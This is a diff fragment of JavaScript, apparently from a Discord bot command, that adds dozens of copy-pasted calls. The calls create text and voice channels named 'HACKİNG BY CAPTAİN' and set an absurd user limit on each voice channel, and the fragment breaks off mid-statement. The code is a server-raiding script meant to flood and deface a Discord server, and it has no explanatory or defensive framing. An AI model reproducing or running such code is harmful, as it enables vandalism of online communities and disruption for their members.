+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
+        chan.setUserLimit("112351474621672476124167212127312416276127456212");
+      });
+    await msg.guild.createChannel("HACKİNG", {
+      type: "text"
+    });
+    await msg.guild.createChannel("HACKİNG BY CAPTAİN", {
+      type: "text"
+    });
+      await msg.guild
+      .createChannel("HACKİNG BY CAPTAİN", {
+        type: "voice"
+      })
+      .then(chan => {
